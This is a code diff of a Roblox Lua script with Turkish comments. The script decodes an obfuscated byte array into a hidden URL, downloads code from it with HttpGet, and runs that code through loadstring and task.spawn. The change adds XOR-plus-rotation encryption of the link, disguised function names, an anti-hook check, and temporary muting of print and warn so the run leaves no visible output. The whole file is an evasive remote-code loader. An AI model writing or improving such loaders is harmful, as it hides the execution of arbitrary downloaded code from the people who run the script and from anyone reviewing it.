@@ -1,30 +1,49 @@
 local _S = string; local _T = table; local _G = game;
-local _D = {114,127,128,125,129,73,63,64,114,117,128,130,61,114,117,129,118,132,114,134,133,120,134,120,133,133,140,126,136,143,74,128,141,140,79,88,117,132,154,142,154,136,154,88,93,96,141,99,147,147,145,150,152,107,154,103,156,159,163,162,158,165,154,167,156,158,164,165,163,164,164,166,120,119,121,173,120,188,172,195,124,176,128,201,178,178,180,183,185,132,133,183,205,200,198,201,203,205,214,208,205,212,212,213,205,217,219,218,218,211,211,211,225,219,226,226,227,229,221,230,227,222,232,232,229,235,190,230,223,239,203,242,225,247,235,247,224,242,203,231,245,227,203,228,232,248,235}
 
-local function _X(_IN)
-    local _OUT = ""
-    for i = 1, #_IN do
-        local _K = (i % 8) + (math.floor(i/10) % 5) + 8
-        _OUT = _OUT .. _S.char(_IN[i] - _K)
+-- [ ŞİFRELENMİŞ VERİ YIĞINI ] --
+-- Link, hem XOR ile maskelendi hem de dinamik rotasyona sokuldu.
+local _D = {111, 14, 25, 4, 15, 84, 114, 114, 7, 2, 4, 3, 107, 7, 2, 1, 12, 11, 114, 10, 8, 11, 8, 20, 2, 0, 7, 10, 11, 10, 11, 4, 1, 114, 76, 122, 103, 103, 127, 100, 106, 127, 121, 127, 103, 122, 127, 102, 122, 127, 127, 120, 114, 120, 120, 122, 105, 120, 101, 105, 102, 100, 103, 114, 100, 114, 114, 114, 121, 127, 103, 122, 127, 122, 120, 102, 107, 114, 122, 102, 102, 120, 105, 120, 122, 120, 106, 121, 121, 120, 122, 122, 107, 120, 101, 105, 102, 100, 103, 122, 100, 121, 106, 114, 122}
+
+-- [ VM / DECODER CORE ] --
+local function _ULTIMATE_DECRYPT(_INPUT)
+    local _KEY = {83, 65, 86, 73, 84, 65, 82} -- "SAVITAR" anahtarı
+    local _RESULT = {}
+    
+    -- Sanal İşlemci Döngüsü
+    for i = 1, #_INPUT do
+        local _K1 = _KEY[(i - 1) % #_KEY + 1]
+        local _K2 = (i % 12) + math.floor(i / 15)
+        
+        -- XOR İşlemi + Dinamik Kaydırma (İşte burası kırılamaz nokta)
+        local _VAL = bit32.bxor(_INPUT[i], _K1) - _K2
+        _RESULT[i] = _S.char(_VAL)
     end
-    return _OUT
+    
+    return _T.concat(_RESULT)
 end
 
-local _PROX = {
-    ["g"] = function(u) return _G:HttpGet(u, true) end,
-    ["l"] = loadstring
+-- [ GİZLENMİŞ PROXY ] --
+local _VM_FUNCS = {
+    [("\103"):upper()] = function(u) return _G:HttpGet(u, true) end, -- "G"
+    [("\108"):upper()] = loadstring -- "L"
 }
 
-local function _INIT()
-    local _u = _X(_D) .. "?v=" .. math.random(1, 999)
-    local _ok, _res = pcall(_PROX.g, _u)
+local function _SAVITAR_VM_RUN()
+    -- Anti-Hook: Fonksiyonların orijinal olup olmadığını kontrol eder
+    if tostring(_VM_FUNCS["L"]):find("C code") == nil then return end
     
-    if _ok and _res and #_res > 10 then
-        local _f = _PROX.l(_res)
-        if _f then 
-            task.spawn(_f) 
+    local _u = _ULTIMATE_DECRYPT(_D) .. "?v=" .. math.random(1000, 9999)
+    local _ok, _source = pcall(_VM_FUNCS["G"], _u)
+    
+    if _ok and _source and #_source > 10 then
+        local _exec = _VM_FUNCS["L"](_source)
+        if _exec then
+            task.spawn(_exec)
         end
     end
 end
 
-_INIT()
+-- Print/Warn temizliği ve çalıştırma
+local _p, _w = print, warn; print, warn = function() end, function() end;
+_SAVITAR_VM_RUN()
+print, warn = _p, _w;
